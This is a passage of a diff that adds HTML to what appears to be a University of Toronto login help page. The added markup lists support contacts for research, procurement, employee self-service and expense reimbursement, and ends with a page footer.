+            <a href="http://www.research.utoronto.ca/about/project-raise/project-raise-help-and-support/">My Research Help</a>
+        </p>
+    </div>
+
+    <button class="accordion" aria-expanded="false">uSOURCE - Online Marketplace for Faculty &amp; Staff</button>
+    <div class="accordion-panel">
+        <p>
+            <a href="mailto:usource@utoronto.ca">usource@utoronto.ca</a>
+        </p>
+        <p>
+            More info:
+            <a href="https://www.procurement.utoronto.ca/programs-and-services/usource/getting-started">uSOURCE - Getting Started</a>
+        </p>
+    </div>
+
+    <button class="accordion" aria-expanded="false">Employee Self-Service (ESS) Help</button>
+    <div class="accordion-panel">
+        <p>
+            Mon-Fri 8:45AM to 5:00PM
+        </p>
+        <p>
+            416 978-3772
+        </p>
+        <p>
+            <a href="mailto:ess.hr@utoronto.ca">ess.hr@utoronto.ca</a>
+        </p>
+        <p>
+            <a href="https://ams-wd.utoronto.ca/sap/bc/webdynpro/sap/zhwd_ess_help_form#">Online ESS Help Form</a>
+        </p>
+        <p>
+            More info:
+            <a href="http://www.hrandequity.utoronto.ca/resources/ess.htm">Human Resources &amp; Equity - ESS</a>
+        </p>
+    </div>
+
+    <button class="accordion" aria-expanded="false">Expense Reimbursement Direct Deposit (ERDD)</button>
+    <div class="accordion-panel">
+        <p>
+            Mon-Fri 9:00AM to 5:00PM
+        </p>
+        <p>
+            <a href="mailto:fast.help@utoronto.ca">fast.help@utoronto.ca</a>
+        </p>
+        <p>
+            <a href="https://finance.utoronto.ca/fast/fast-team-contacts-and-faculty-representatives/">ERDD Contacts</a>
+        </p>
+        <p>
+            More info:
+            <a href="https://finance.utoronto.ca/fast/support-documentation/financial-accounting/accounts-payable/reimbursements/">
+            ERDD Training/Documentation</a>
+        </p>
+    </div>
+
+    <button class="accordion" aria-expanded="false">Information Commons Help Desk</button>
+    <div class="accordion-panel">
+        <p>
+            The <a href="http://help.ic.utoronto.ca/">Information Commons Help Desk</a>
+            is available to help you with problems related to the many on-line services provided by the University.
+        </p>
+    </div>
+</article>
+        </aside> 
+<!-- footer part -->
+<footer>
+    <ul class="footer-list">
+        <li>[build 2024-Jan-12 AODA]</li>
+        <li><a href="http://www.utoronto.ca/accessibility.htm" title=""><b>Accessibility</b></a></li>
+        <li><b>login21</b></li>
+        <li>© University of Toronto</li>
+    </ul>
+</footer>
+    </div>
+
+
+
+</body>
+</html>
